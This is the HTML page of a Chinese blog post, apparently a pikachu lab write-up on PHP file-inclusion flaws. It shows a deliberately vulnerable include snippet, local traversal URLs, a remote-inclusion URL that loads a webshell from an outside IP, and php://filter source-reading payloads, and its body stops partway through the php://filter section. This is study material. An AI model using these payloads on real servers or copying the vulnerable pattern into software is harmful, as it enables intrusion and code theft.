@@ -1,0 +1,558 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha256-HtsXJanqjKTc8vVQjO4YMhiqFoXkfBsjBWcX91T1jr8=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":"ture","trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="文件包含">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pikachu靶场系列-文件包含">
+<meta property="og:url" content="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/index.html">
+<meta property="og:site_name" content="欢 迎 光 临">
+<meta property="og:description" content="文件包含">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images%5C1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png">
+<meta property="og:image" content="http://example.com/images%5C1665548578354-65d54b73-13d4-479e-a612-8a94666a946e.png">
+<meta property="og:image" content="http://example.com/images%5C1665548677709-994eb1e9-8ce4-4b54-a7ce-b43ba524a81b.png">
+<meta property="og:image" content="http://example.com/images%5C1665548837727-24f9f2b0-6db0-444a-87bf-6fd594234b14.png">
+<meta property="og:image" content="http://example.com/images%5C1665548957675-151147db-cf72-4912-b15b-912d05a3f5a3.png">
+<meta property="og:image" content="http://example.com/images%5C1665548976257-f26bdcd3-3cd0-44d7-bf92-58b022181c82.png">
+<meta property="og:image" content="http://example.com/images%5C1665549175086-f3f7b228-8f11-403c-b1b2-d24645f4da35.png">
+<meta property="og:image" content="http://example.com/images%5C1665549338675-ef15c7d1-969f-42ac-8901-ed8d07b561f7.png">
+<meta property="og:image" content="http://example.com/images%5C1665549391173-c968d06e-653e-455f-b332-b3a2d5c929f2.png">
+<meta property="og:image" content="http://example.com/images%5C1665549595086-117eac0d-a45f-4cef-b0cb-7b2725264307.png">
+<meta property="og:image" content="http://example.com/images%5C1665549685531-33aae4d1-c9f3-4214-ba02-e78c0ff7fa52.png">
+<meta property="og:image" content="http://example.com/images%5C1665549879949-97e9a3df-50ba-4574-876d-7bac85d67474.png">
+<meta property="og:image" content="http://example.com/images%5C1665549917113-330ca4b7-1487-44f7-8685-8b2e1d2961db.png">
+<meta property="og:image" content="http://example.com/images%5C1665550009883-f247beb2-fa3c-485b-aff5-2b4d2abc0b34.png">
+<meta property="og:image" content="http://example.com/images%5C1665550111038-486f417d-e512-4b90-bb8b-3c4fd955668f.png">
+<meta property="og:image" content="http://example.com/images%5C1665550147767-2eb9da43-df4f-403b-80ab-f6b11ffa004b.png">
+<meta property="og:image" content="http://example.com/images%5C1667208263840-995730b8-919e-413b-8c23-20de1420ef72.png">
+<meta property="og:image" content="http://example.com/images%5C1665551479736-692dab58-19ba-4b50-919f-ba7a2728234f.png">
+<meta property="og:image" content="http://example.com/images%5C1665551787085-f3974026-477a-4d9f-a0e6-6d73ee681d22.png">
+<meta property="og:image" content="http://example.com/images%5C1665552085670-d65faa8e-7c35-4bd4-b7c6-3ddb931d96f3.png">
+<meta property="og:image" content="http://example.com/images%5C1665552219256-d3e33144-a285-4508-a9eb-1b3d113ec534.png">
+<meta property="og:image" content="http://example.com/images%5C1665552740842-2fc06e76-2a33-47f5-91ad-54966d86098b.png">
+<meta property="og:image" content="http://example.com/images%5C1665552781766-418dfd08-3f0f-49d1-aca6-583a39cba4d9.png">
+<meta property="og:image" content="http://example.com/images%5C1665552813790-cfd814e9-89fd-451e-ae0e-62cb1174fa20.png">
+<meta property="og:image" content="http://example.com/images%5C1665552983029-fcb88f2c-8787-4b43-adc0-f4dcf6ba34ad.png">
+<meta property="og:image" content="http://example.com/images%5C1665553091038-929159af-6752-4d6a-94a3-3aa1efbf9c89.png">
+<meta property="og:image" content="http://example.com/images%5C1665988456872-620d4754-4c28-4824-ad98-c94cc9121279.png">
+<meta property="og:image" content="http://example.com/images%5C1665988596163-a8ab4cfd-0c5f-4f47-aea6-f1020bf0d755.png">
+<meta property="og:image" content="http://example.com/images%5C1665988872945-496b2ace-1bd1-4fce-ad7f-8da9e42d1e28.png">
+<meta property="og:image" content="http://example.com/images%5C1665989231978-3ba62296-6db8-447f-bf9e-cce19cb8b604.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110103343335.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110103439657.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110103559613.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110104124430.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110104347093.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110104804316.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110104922768.png">
+<meta property="og:image" content="http://example.com/images%5Cimage-20230110105123160.png">
+<meta property="article:published_time" content="2023-05-04T02:32:54.024Z">
+<meta property="article:modified_time" content="2023-05-04T02:32:54.025Z">
+<meta property="article:author" content="fn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images%5C1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png">
+
+
+<link rel="canonical" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","path":"2023/05/04/pikachu靶场系列/文件包含/","title":"pikachu靶场系列-文件包含"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>pikachu靶场系列-文件包含 | 欢 迎 光 临</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">欢 迎 光 临</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">文件包含概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A6%82%E8%BF%B0"><span class="nav-number">1.1.</span> <span class="nav-text">概述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B6%89%E5%8F%8A%E5%87%BD%E6%95%B0"><span class="nav-number">1.1.1.</span> <span class="nav-text">涉及函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%89%B9%E7%82%B9"><span class="nav-number">1.1.2.</span> <span class="nav-text">特点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B5%8B%E8%AF%95"><span class="nav-number">1.2.</span> <span class="nav-text">测试</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.2.1.</span> <span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="nav-number">1.2.2.</span> <span class="nav-text">远程文件包含</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-number">1.3.</span> <span class="nav-text">伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-x2F-x2F"><span class="nav-number">1.3.1.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.3.1.0.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BF%85%E9%A1%BB%E4%BD%BF%E7%94%A8%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84"><span class="nav-number">1.3.1.0.2.</span> <span class="nav-text">必须使用绝对路径</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-x2F-x2F-filter"><span class="nav-number">1.3.2.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1"><span class="nav-number">1.3.2.0.1.</span> <span class="nav-text">本地文件包含</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-1"><span class="nav-number">1.3.2.0.2.</span> <span class="nav-text">远程文件包含</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E6%AD%A4%E6%9D%A5%E5%8C%85%E5%90%AB%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.3.2.0.3.</span> <span class="nav-text">可以利用此来包含一句话木马</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%AF%BB%E5%8F%96payload"><span class="nav-number">1.3.2.0.4.</span> <span class="nav-text">读取payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#zip-x2F-x2F"><span class="nav-number">1.3.3.</span> <span class="nav-text">zip:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6-1"><span class="nav-number">1.3.3.0.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8"><span class="nav-number">1.3.3.0.2.</span> <span class="nav-text">使用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phar-x2F-x2F"><span class="nav-number">1.3.4.</span> <span class="nav-text">phar:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6-2"><span class="nav-number">1.3.4.0.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">1.3.4.0.2.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php-x2F-x2F-input"><span class="nav-number">1.3.5.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6-3"><span class="nav-number">1.3.5.0.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-1"><span class="nav-number">1.3.5.0.2.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#data-x2F-x2F"><span class="nav-number">1.3.6.</span> <span class="nav-text">data:&#x2F;&#x2F;</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6-4"><span class="nav-number">1.3.6.0.1.</span> <span class="nav-text">限制条件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-2"><span class="nav-number">1.3.6.0.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%AF%E4%BB%A5%E5%8C%85%E5%90%AB%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC"><span class="nav-number">1.3.6.1.</span> <span class="nav-text">可以包含一句话木马</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E9%81%93CTF%E9%A2%98"><span class="nav-number">1.4.</span> <span class="nav-text">一道CTF题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E8%A7%A3%E8%AF%BB"><span class="nav-number">1.4.1.</span> <span class="nav-text">代码解读</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ls%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.2.</span> <span class="nav-text">ls查看文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E2%80%9Cflag%E2%80%9D"><span class="nav-number">1.4.3.</span> <span class="nav-text">绕过“flag”</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87cat-f-%E8%AF%BB%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%89%80%E6%9C%89f%E5%BC%80%E5%A4%B4%E7%9A%84%E6%96%87%E4%BB%B6"><span class="nav-number">1.4.3.0.1.</span> <span class="nav-text">1.可以通过cat f*读取当前目录所有f开头的文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-base64%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.3.0.2.</span> <span class="nav-text">2.base64绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-%E5%8F%8D%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.3.0.3.</span> <span class="nav-text">3.反斜杠绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-1%EF%BC%8C-2%E5%92%8C-%E7%BB%95%E8%BF%87"><span class="nav-number">1.4.3.0.4.</span> <span class="nav-text">4.$1，$2和$@绕过</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2"><span class="nav-number">2.</span> <span class="nav-text">本地文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">2.0.1.</span> <span class="nav-text">payload</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-2"><span class="nav-number">3.</span> <span class="nav-text">远程文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">3.0.1.</span> <span class="nav-text">payload</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-3"><span class="nav-number">3.0.1.0.1.</span> <span class="nav-text">远程文件包含</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%88%A9%E7%94%A8"><span class="nav-number">3.0.2.</span> <span class="nav-text">伪协议利用</span></a></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">fn</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">16</span>
+          <span class="site-state-item-name">总计</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/04/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="fn">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="欢 迎 光 临">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="pikachu靶场系列-文件包含 | 欢 迎 光 临">
+      <meta itemprop="description" content="文件包含">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pikachu靶场系列-文件包含
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2023-05-04 10:32:54" itemprop="dateCreated datePublished" datetime="2023-05-04T10:32:54+08:00">2023-05-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pikachu%E9%9D%B6%E5%9C%BA%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">pikachu靶场系列</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>5.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>10 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">文件包含</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h1 id="文件包含概述"><a href="#文件包含概述" class="headerlink" title="文件包含概述"></a>文件包含概述</h1><p><img src="/images%5C1665555684868-38ea26c8-b175-45e4-95a3-435db5eb951b.png" alt="img"></p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><h3 id="涉及函数"><a href="#涉及函数" class="headerlink" title="涉及函数"></a>涉及函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">include() 出错仅是警告，脚本继续执行 </span><br><span class="line">require() 出错则爆出致命错误，脚本立刻终止 </span><br><span class="line">include_once() 与include()相同，区别在于当被包含的代码存在时，则不重复包含 </span><br><span class="line">require_once() 与require()相同，区别在于当被包含的代码存在时，则不重复包含</span><br></pre></td></tr></table></figure>
+
+<h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>1、可以包含任何文件 </p>
+<p>2、被包含文件中的代码满足php代码格式就会被解析执行，与后缀无关。</p>
+<p>3、如果文件中的内容不满足php代码格式，那就会直接显示在页面上。</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include $file;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样是正常的，因为我们还没有对其file参数传参</p>
+<p><img src="/images%5C1665548578354-65d54b73-13d4-479e-a612-8a94666a946e.png" alt="img"></p>
+<h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
+<p><img src="/images%5C1665548677709-994eb1e9-8ce4-4b54-a7ce-b43ba524a81b.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=../index.html">http://127.0.0.1:88/DX/file_include/index.php?file=../index.html</a></p>
+<p><img src="/images%5C1665548837727-24f9f2b0-6db0-444a-87bf-6fd594234b14.png" alt="img"></p>
+<p>只要是php代码就行，文件后缀无所谓</p>
+<p><img src="/images%5C1665548957675-151147db-cf72-4912-b15b-912d05a3f5a3.png" alt="img"></p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=test.txt</a></p>
+<p><img src="/images%5C1665548976257-f26bdcd3-3cd0-44d7-bf92-58b022181c82.png" alt="img"></p>
+<h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com">http://127.0.0.1:88/DX/file_include/index.php?file=http://www.baidu.com</a></p>
+<p><img src="/images%5C1665549175086-f3f7b228-8f11-403c-b1b2-d24645f4da35.png" alt="img"></p>
+<p>包含一句话后连接</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=http://101.35.17.6:6666/test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=http://101.35.17.6:6666/test.txt</a></p>
+<p><img src="/images%5C1665549338675-ef15c7d1-969f-42ac-8901-ed8d07b561f7.png" alt="img"></p>
+<p><img src="/images%5C1665549391173-c968d06e-653e-455f-b332-b3a2d5c929f2.png" alt="img"></p>
+<h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><h3 id="file-x2F-x2F"><a href="#file-x2F-x2F" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h3><p>访问本地系统文件</p>
+<p><img src="/images%5C1665549595086-117eac0d-a45f-4cef-b0cb-7b2725264307.png" alt="img"></p>
+<h5 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h5><p>allow_url_include:off&#x2F;on</p>
+<p>allow_url_fopen:off&#x2F;on</p>
+<h5 id="必须使用绝对路径"><a href="#必须使用绝对路径" class="headerlink" title="必须使用绝对路径"></a>必须使用绝对路径</h5><p>file:&#x2F;&#x2F;绝对路径&#x2F;文件名</p>
+<p><img src="/images%5C1665549685531-33aae4d1-c9f3-4214-ba02-e78c0ff7fa52.png" alt="img"></p>
+<h3 id="php-x2F-x2F-filter"><a href="#php-x2F-x2F-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h3><p>利用php流filter返回base64加密后的php源代码</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>resource&#x3D;&lt;要过滤的数据流&gt;</td>
+<td>这个参数是必须的。它指定了你要筛选过滤的数据流。</td>
+</tr>
+<tr>
+<td>read&#x3D;&lt;读链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
+</tr>
+<tr>
+<td>write&#x3D;&lt;写链的筛选列表&gt;</td>
+<td>该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</td>
+</tr>
+<tr>
+<td>&lt;；两个链的筛选列表&gt;</td>
+<td>任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</td>
+</tr>
+</tbody></table>
+<p>我们可以利用php的filter机制来得到我们想要的文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=文件名.php</span><br></pre></td></tr></table></figure>
+
+<h5 id="本地文件包含-1"><a href="#本地文件包含-1" class="headerlink" title="本地文件包含"></a>本地文件包含</h5><p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt</a></p>
+<p><img src="/images%5C1665549879949-97e9a3df-50ba-4574-876d-7bac85d67474.png" alt="img"></p>
+<h5 id="远程文件包含-1"><a href="#远程文件包含-1" class="headerlink" title="远程文件包含"></a>远程文件包含</h5><p><a target="_blank" rel="noopener" href="http://127.0.0.1:88/DX/file_include/index.php?file=php://filter/read=convert.base64-encode/resource=test.txt">http://127.0.0.1:88/DX/file_include&#x2F;index.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;</a><a target="_blank" rel="noopener" href="http://www.baidu.com/">http://www.baidu.com</a></p>
+<p><img src="/images%5C1665549917113-330ca4b7-1487-44f7-8685-8b2e1d2961db.png" alt="img"></p>
